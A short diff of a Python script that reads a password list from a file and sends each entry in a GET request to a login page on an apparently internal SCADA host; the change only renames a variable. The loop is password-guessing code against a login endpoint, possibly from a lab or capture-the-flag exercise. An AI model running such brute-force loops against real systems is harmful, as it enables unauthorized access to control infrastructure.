@@ -15,4 +15,4 @@ with open("passwords.txt") as file:
 	
 for password in passwords:
 	URL = 'http://scada.m4i.local/login.php?command={}'.format(password)
-	ihatemylife = requests.get(url = URL)
+	request = requests.get(url = URL)
